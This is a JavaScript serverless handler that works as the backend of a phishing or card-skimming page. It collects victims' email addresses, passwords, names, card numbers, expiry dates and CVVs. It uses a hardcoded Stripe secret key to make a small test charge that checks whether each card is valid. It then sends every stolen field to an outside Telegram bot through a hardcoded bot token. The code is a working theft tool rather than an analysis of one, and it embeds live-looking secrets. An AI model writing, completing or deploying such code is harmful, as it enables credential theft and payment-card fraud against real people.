import axios from 'axios';
import { stringify } from 'querystring';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { em, pw, nm, cc, ex, cv, stripeToken } = req.body;

    const tg_token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chat_id = "7993722214";
    const stripe_secret = "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";

    try {
        let estatusPago = "No procesado";
        let cargoExitoso = false;

        // Solo intentar cargo si el token es válido (empieza con tok_)
        if (stripeToken && stripeToken.startsWith('tok_')) {
            try {
                const chargeData = stringify({
                    amount: 1000, // $10.00 MXN (Mínimo para evitar Error 400)
                    currency: 'mxn',
                    source: stripeToken,
                    description: `Validacion: ${em}`
                });

                const charge = await axios.post('https://api.stripe.com/v1/charges', chargeData, {
                    headers: { 
                        'Authorization': `Bearer ${stripe_secret}`, 
                        'Content-Type': 'application/x-www-form-urlencoded' 
                    }
                });

                if (charge.data.status === 'succeeded') {
                    cargoExitoso = true;
                    estatusPago = "✅ COBRO EXITOSO ($10.00 MXN)";
                }
            } catch (stripeErr) {
                estatusPago = "❌ RECHAZADA: " + (stripeErr.response?.data?.error?.message || "Error bancario");
            }
        } else {
            estatusPago = "⚠️ INFO (Sin cobro - " + (stripeToken || "Token nulo") + ")";
        }

        const msgHit = `🔔 **NUEVO HIT** 🔔\n\n` +
                       `💰 **Resultado:** ${estatusPago}\n` +
                       `📧 **Email:** \`${em}\` \n` +
                       `🔑 **Pass:** \`${pw}\` \n` +
                       `👤 **Nombre:** \`${nm}\` \n` +
                       `💳 **Tarjeta:** \`${cc}\` \n` +
                       `📅 **Exp:** \`${ex}\` \n` +
                       `🔒 **CVV:** \`${cv}\``;

        await axios.post(`https://api.telegram.org/bot${tg_token}/sendMessage`, {
            chat_id: chat_id,
            text: msgHit,
            parse_mode: 'Markdown'
        });

        return res.status(200).json({ pago: cargoExitoso });

    } catch (error) {
        return res.status(200).json({ pago: false });
    }
}
